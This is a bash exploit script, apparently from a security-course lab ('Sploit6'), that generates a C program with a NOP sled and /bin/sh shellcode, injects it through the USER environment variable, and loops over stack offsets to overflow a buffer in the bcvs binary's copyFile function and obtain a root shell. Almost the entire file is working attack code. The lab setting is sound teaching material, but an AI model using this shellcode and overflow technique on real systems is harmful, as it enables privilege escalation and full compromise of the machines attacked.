#!/bin/bash

## -------------------- Description -------------------- ##
# Sploit6 takes advantage of a buffer overflow in the checkout conditional
# of the copyFile function. This sploit is a standard buffer overflow
# leading to a control flow hijack. The overwritten return pointer of the
# copyFile function points back up the stack into the approximate region
# where the buffer has overflowed and hits a nop sled.
## ----------------------------------------------------- ##

EXPLOIT_EXE="./exploit"

rm -rf exploit
rm -rf exploit.c
rm -rf haxor

cat <<EOS > "exploit.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BSIZE 256
#define NOP 0x90

// Shellcode for exec of /bin/sh
char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";


unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void main(int argc, char* argv[]) {
  char buff[DEFAULT_BSIZE];
  char *ptr;
  long *long_ptr, addr;
  int i = 0;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BSIZE;

  if (argc > 1) offset = atoi(argv[1]);

  addr = get_sp() + offset;


  ptr = buff;

  long_ptr = (long *) (ptr);
  //First we fill the buffer with our best guess of the address for
  //the buffer in the attacked program
  for (i = 0; long_ptr < (buff + 60); i += 4) {
	*(long_ptr++) = addr;
  }

  // Setup the nop sled
  char *buf_ptr = (char *) (ptr + 60); 
  for (i = (buff + 60); i < (buff + bsize); ++i) {
    *(buf_ptr++) = NOP;
    //buff[i] = NOP;
  }

  // Insert our shellcode
  ptr = (buff + 186);
  for (i = 0; i < strlen(shellcode); ++i) {
    *(ptr++) = shellcode[i];
  }

  buff[bsize-1] = '\0';
  printf(buff);
  return;
}

EOS



gcc -o exploit exploit.c

SHELL_CODE=$($EXPLOIT_EXE)

#OFFSET=100
OFFSET=0
SHELL_CODE=$($EXPLOIT_EXE $OFFSET)

export USER=${SHELL_CODE}
export PATH=""
echo ${USER}
echo ${PATH}

echo "junk" > "dummy_input"
echo "hey" > "haxor"
/opt/bcvs/bcvs ci haxor < dummy_input

while [ "$OFFSET" -le 500 ]
do
SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
export USER=${SHELL_CODE}
/opt/bcvs/bcvs co blah < dummy_input
((OFFSET++))
done
# And then hopefully you have a root shell at this point
